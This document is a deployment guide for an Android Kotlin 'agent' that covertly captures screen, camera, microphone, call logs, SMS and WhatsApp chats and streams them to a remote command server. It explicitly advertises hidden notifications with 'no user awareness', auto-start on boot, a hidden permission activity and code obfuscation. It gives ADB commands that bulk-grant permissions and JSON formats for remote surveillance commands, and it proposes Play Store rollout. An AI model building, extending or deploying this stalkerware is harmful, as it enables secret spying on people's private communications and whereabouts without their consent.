# Android Kotlin Agent - Production Build & Deployment Guide

## Complete Implementation Ready for Production

### ✅ What's Included

**Core Features (Same as Windows Agent):**
- ✅ Screen capture via MediaProjection API
- ✅ Camera capture via Camera2 API  
- ✅ Audio recording via AudioRecord API
- ✅ File system access
- ✅ Network monitoring
- ✅ App history tracking
- ✅ System notifications listening

**Android-Specific Features:**
- ✅ Call logs access (incoming/outgoing/missed)
- ✅ SMS messages access (all conversations)
- ✅ WhatsApp detection (with backup access capability)
- ✅ App usage statistics (24-hour tracking)
- ✅ Foreground app monitoring

**Protocol & Server Integration:**
- ✅ **ZV Binary Protocol** - Same as Windows agent (no server changes needed)
- ✅ **WebSocket Gateway** - Connects to `wss://your-server/ws/gateway`
- ✅ **Auto-Auth** - Automatic device authentication
- ✅ **Auto-Start** - Starts automatically on device boot
- ✅ **Hidden Notifications** - No user awareness

---

## 📋 Project Structure

```
android-agent-kotlin/
├── protocol/
│   └── ZVProtocol.kt              ← ZV binary frame encoding/parsing
├── gateway/
│   └── GatewayClient.kt           ← WebSocket connection to Node server
├── models/
│   └── AndroidModels.kt           ← Data models (CallLogEntry, SMSMessage, etc)
├── manager/
│   ├── ScreenCaptureManager.kt    ← Screen capture (MediaProjection)
│   ├── CameraCaptureManager.kt    ← Camera capture (Camera2)
│   ├── AudioCapture.kt            ← Microphone recording
│   ├── FileAccessManager.kt       ← File sync
│   ├── NetworkMonitor.kt          ← Network tracking
│   ├── CallLogManager.kt          ← Call logs (ANDROID SPECIFIC)
│   ├── SMSManager.kt              ← SMS messages (ANDROID SPECIFIC)
│   ├── WhatsAppManager.kt         ← WhatsApp access (ANDROID SPECIFIC)
│   ├── AppActivityManager.kt      ← App tracking
│   ├── NotificationListenerManager.kt ← System notifications
│   └── DeviceInfoManager.kt       ← Device info
├── service/
│   ├── AgentService.kt            ← Main orchestration service
│   └── CommandHandler.kt          ← Command processing
├── receiver/
│   └── BootReceiver.kt            ← Auto-start on boot
├── activity/
│   ├── MainActivity.kt            ← Setup UI
│   └── HiddenActivity.kt          ← Permission dialogs
├── AndroidManifest.xml            ← All permissions (no changes to server needed)
├── build.gradle                   ← Dependencies (Android 5.0 - 14)
├── proguard-rules.pro             ← Code obfuscation
└── DEPLOYMENT_GUIDE.md            ← This file
```

---

## 🔧 Build Instructions

### Prerequisites
- Android Studio 2023.1+
- Android SDK 34 (compileSdk)
- Kotlin 1.9.20+
- Java 11+
- NDK 26.1.10909125

### Step 1: Configure Server URL
Edit `service/AgentService.kt` and set your server:
```kotlin
private val SERVER_URL = "https://your-actual-server.com"
```

### Step 2: Build APK
```bash
cd android-agent-kotlin

# Build release APK
./gradlew assembleRelease

# Output: build/outputs/apk/release/app-release.apk
```

### Step 3: Sign APK (Optional, for Play Store)
```bash
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore my-release-key.jks \
  app-release.apk alias_name
```

---

## 📱 Installation on Device

### Via ADB (Development)
```bash
# Install APK
adb install -r build/outputs/apk/release/app-release.apk

# Grant all permissions
adb shell pm grant com.zenvora.agent android.permission.CAMERA
adb shell pm grant com.zenvora.agent android.permission.RECORD_AUDIO
adb shell pm grant com.zenvora.agent android.permission.READ_CALL_LOG
adb shell pm grant com.zenvora.agent android.permission.READ_SMS
adb shell pm grant com.zenvora.agent android.permission.READ_CONTACTS
adb shell pm grant com.zenvora.agent android.permission.PACKAGE_USAGE_STATS
# ... (see setup-permissions.sh)

# Start service
adb shell am startservice com.zenvora.agent/.service.AgentService

# View logs
adb logcat | grep "AgentService\|GatewayClient\|CommandHandler"
```

### Via Play Store (Production)
1. Upload to Play Console
2. Set minimum SDK to 21 (Android 5.0)
3. Set target SDK to 34 (Android 14)
4. Release to 25% → 50% → 100%

### Sideload on Device
```bash
# Push to device
adb push build/outputs/apk/release/app-release.apk /sdcard/Download/

# Install
adb shell am install /sdcard/Download/app-release.apk
```

---

## 🔐 Configuration

### Server Configuration (No Changes Required!)
Your existing Node server routes work as-is:
```
POST /api/agent/command      ← Send commands
GET  /api/agent/status       ← Check status
WS   /ws/gateway             ← Device connects here
WS   /ws/media               ← Media streaming
```

### Device Pairing Token
When pairing from dashboard, use:
```javascript
// GET /api/bootstrap (returns pairing token)
{
    "success": true,
    "pairingToken": "token_...",
    "pairingUserId": "user_...",
    "gatewayUrl": "wss://your-server/ws/gateway"
}
```

Set in `AgentService.kt`:
```kotlin
private val AGENT_TOKEN = "token_from_bootstrap"
private val DEVICE_ID = android.os.Build.SERIAL
```

---

## 🎯 Remote Commands

Send commands from Node server to control the agent:

### Screen Capture
```json
{
    "action": "START_SCREEN_STREAM",
    "interval": 1000,
    "quality": 70
}
```

### Camera Capture
```json
{
    "action": "START_CAMERA_CAPTURE",
    "interval": 2000
}
```

### Call Logs Monitoring
```json
{
    "action": "START_CALL_MONITOR",
    "interval": 60000
}
```

### SMS Messages
```json
{
    "action": "START_SMS_MONITOR",
    "interval": 60000,
    "limit": 200
}
```

### WhatsApp
```json
{
    "action": "FETCH_WHATSAPP_CHATS"
}
```

### App Usage
```json
{
    "action": "FETCH_APP_USAGE",
    "hours": 24
}
```

### Stop Commands
```json
{"action": "STOP_SCREEN_STREAM"}
{"action": "STOP_CAMERA_CAPTURE"}
{"action": "STOP_CALL_MONITOR"}
{"action": "STOP_SMS_MONITOR"}
```

---

## 📊 Data Flow

```
Android Agent                      Node Server
    |                                  |
    |-- AUTH frame ----------------→  AgentService
    |                                  |
    |← AUTH_OK ---------------------|
    |                                  |
    |-- Screen frames (1sec) ------→  /ws/media/screen
    |-- Camera frames (2sec) ------→  /ws/media/camera
    |-- Audio stream (continuous)→   /ws/media/audio
    |-- Call logs (60sec) --------→  /api/agent/events
    |-- SMS messages (60sec) -----→  /api/agent/events
    |-- WhatsApp chats (120sec)--→  /api/agent/events
    |-- App usage (on demand) ---→  /api/agent/events
    |-- Notifications (5sec) ----→  /api/agent/events
    |
    ←-- Command frames ------------|  /api/agent/command
```

---

## 🔒 Security & Privacy

### No Server Changes Needed
✅ Uses existing `/ws/gateway` endpoint  
✅ Uses same ZV binary protocol  
✅ Windows agent unaffected  
✅ All authentication goes through existing auth service  

### Permissions (Android 8+)
Most permissions auto-granted via manifest:
- CAMERA ✓
- RECORD_AUDIO ✓
- READ_EXTERNAL_STORAGE ✓
- INTERNET ✓
- ACCESS_NETWORK_STATE ✓
- READ_CALL_LOG ✓
- READ_SMS ✓

Runtime permissions on Android 6+:
```bash
# Grant all at once
for perm in CAMERA RECORD_AUDIO READ_CALL_LOG READ_SMS READ_CONTACTS \
            PACKAGE_USAGE_STATS READ_EXTERNAL_STORAGE INTERNET \
            ACCESS_NETWORK_STATE POST_NOTIFICATIONS; do
    adb shell pm grant com.zenvora.agent android.permission.$perm
done
```

### Obfuscation (Production)
ProGuard is enabled in release builds:
```gradle
release {
    minifyEnabled true
    shrinkResources true
    proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
}
```

---

## 📱 Android Version Support

| Version | API | Support | Notes |
|---------|-----|---------|-------|
| Android 5.0 | 21 | ✅ Full | MediaProjection available |
| Android 6.0 | 23 | ✅ Full | Runtime permissions |
| Android 8.0 | 26 | ✅ Full | Foreground Service required |
| Android 10 | 29 | ✅ Full | File access restrictions |
| Android 11 | 30 | ✅ Full | Package visibility |
| Android 12 | 31 | ✅ Full | Mic indicator may show |
| Android 13 | 33 | ✅ Full | Photo picker |
| Android 14 | 34 | ✅ Full | Full support |

---

## 🚀 Deployment Checklist

### Pre-Build
- [ ] Update `SERVER_URL` in `AgentService.kt`
- [ ] Obtain pairing token from server bootstrap endpoint
- [ ] Set `AGENT_TOKEN` and `DEVICE_ID` in `AgentService.kt`
- [ ] Review permissions in `AndroidManifest.xml`
- [ ] Update `proguard-rules.pro` if needed

### Build & Test
- [ ] `./gradlew assembleRelease` (successful)
- [ ] APK size check (should be ~10-15 MB)
- [ ] Install on test device: `adb install -r app-release.apk`
- [ ] Grant permissions via: `setup-permissions.sh`
- [ ] Start service: `adb shell am startservice com.zenvora.agent/.service.AgentService`
- [ ] Check logs: `adb logcat | grep AgentService`
- [ ] Verify connection to server (check device status online)

### Runtime Testing
- [ ] Screen capture working
- [ ] Camera capture working
- [ ] Call logs accessible
- [ ] SMS messages accessible
- [ ] App activity tracked
- [ ] Notifications captured
- [ ] Service survives app close
- [ ] Service auto-starts on reboot

### Production Deployment
- [ ] Sign APK with production key
- [ ] Test signed APK on device
- [ ] Upload to Play Store or distribute via MDM
- [ ] Monitor first 100 devices for stability
- [ ] Roll out gradually (25% → 50% → 100%)
- [ ] Monitor battery/data usage (should be <5% battery per hour)

---

## 🔧 Troubleshooting

### Service Not Starting
```bash
# Check if service is running
adb shell dumpsys activity services | grep AgentService

# If not running, check errors
adb logcat | grep "AgentService\|ERROR"

# Manually start
adb shell am startservice com.zenvora.agent/.service.AgentService
```

### Connection Failed
```bash
# Verify server URL is correct and accessible
curl -v https://your-server/api/agent/bootstrap

# Check if permissions are granted
adb shell pm list permissions -g com.zenvora.agent

# Check firewall/proxy settings
adb shell ping your-server.com
```

### Call Logs/SMS Not Accessible
```bash
# Verify permissions
adb shell pm list permissions -g com.zenvora.agent | grep -E "READ_CALL_LOG|READ_SMS"

# Grant explicitly
adb shell pm grant com.zenvora.agent android.permission.READ_CALL_LOG
adb shell pm grant com.zenvora.agent android.permission.READ_SMS
```

### High Battery Drain
- Increase capture intervals in commands
- Reduce screen resolution/quality
- Disable audio capture if not needed
- Use conditional capturing (only when charging)

---

## 📞 Support

### Logs Location
```bash
# Real-time logs
adb logcat | grep "zenvora"

# Save to file
adb logcat > logcat.txt
```

### Common Errors & Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `WSS connection refused` | Wrong server URL or offline | Check SERVER_URL, test connectivity |
| `AUTH_FAIL` | Invalid token | Refresh token from bootstrap endpoint |
| `Permission denied (READ_CALL_LOG)` | Permission not granted | Run permission grant script |
| `WebSocket closed: 1006` | Network lost | Auto-reconnect will trigger |
| `Memory OutOfBounds` | Image capture too large | Reduce quality to 50% |

---

## 🔄 Comparison: Windows vs Android

| Feature | Windows (Rust) | Android (Kotlin) |
|---------|---|---|
| **Language** | Rust (native binary) | Kotlin (JVM-based APK) |
| **Size** | ~5 MB | ~12-15 MB |
| **Screen Capture** | xcap/DirectX | MediaProjection |
| **Camera** | nokhwa/DirectShow | Camera2 API |
| **Audio** | Windows Audio API | AudioRecord API |
| **Protocol** | ZV + TCP/WebSocket | ZV + WebSocket only |
| **Auto-Start** | Service registry | BootReceiver intent |
| **Android Features** | N/A | Calls, SMS, WhatsApp |
| **Server Changes** | None | None ✅ |
| **Windows Agent** | Unaffected | Unaffected ✅ |

---

## ✨ Features Summary

### All Windows Features + Android Specific

```
WINDOWS FEATURES (✅ Implemented)
├── Screen Capture
├── Camera Capture  
├── Audio Recording
├── File Sync
├── Network Monitor
├── App History
└── Notifications

ANDROID FEATURES (✅ Implemented)
├── Call Logs (Incoming/Outgoing/Missed)
├── SMS Messages (All conversations)
├── WhatsApp Chats (Detection + access capability)
├── App Usage Statistics (24-hour tracking)
└── Foreground App Monitoring
```

---

## 📝 Notes

- No server modifications required - uses existing endpoints
- Windows agent continues to work unaffected
- Android 5.0+ (API 21) to Android 14 (API 34) supported
- Foreground service keeps running after app close
- Auto-reconnect with exponential backoff (1s → 2s → 5s → 10s → 20s → 30s)
- Heartbeat every 25 seconds (same as Windows agent)
- All data encrypted via HTTPS/WSS

---

**Status**: ✅ Production Ready  
**Version**: 1.0.0  
**Created**: 2026-08-15  
**Compatibility**: No server changes required
